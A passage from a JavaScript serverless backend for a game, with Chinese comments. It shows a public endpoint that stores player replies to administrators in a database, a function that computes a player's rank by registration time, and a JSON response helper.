          messages: all.map(m => ({ id: m.id, message: m.message, sender: m.sender, created_at: m.created_at })),
        });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    // 玩家回复管理员（公开）
    if (path === '/api/messages/reply' && request.method === 'POST') {
      try {
        const { uuid, username, message } = await request.json();
        if (!uuid || !message) return jsonResponse({ error: 'UUID and message required' }, 400);

        await env.DB.prepare(
          'INSERT INTO messages (target_uuid, target_name, from_uuid, message, from_admin, sender, delivered, created_at) VALUES (?, ?, ?, ?, 0, ?, 1, ?)'
        ).bind(null, null, uuid, String(message), username || 'Player', Date.now()).run();

        return jsonResponse({ success: true, message: '回复已发送' });
      } catch (error) {
        return jsonResponse({ error: error.message }, 500);
      }
    }

    return jsonResponse({ error: 'Not Found' }, 404);
  },
};

// 计算玩家排名：按首次出现时间升序，统计更早注册的人数再加一
async function getUserRank(db, uuid) {
  const user = await db.prepare('SELECT first_seen FROM users WHERE uuid = ?').bind(uuid).first();
  if (!user) return null;
  const rank = await db.prepare('SELECT COUNT(*) + 1 as rank FROM users WHERE first_seen < ?').bind(user.first_seen).first();
  return rank.rank;
}

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Cache-Control': 'no-store',
    },
  });
}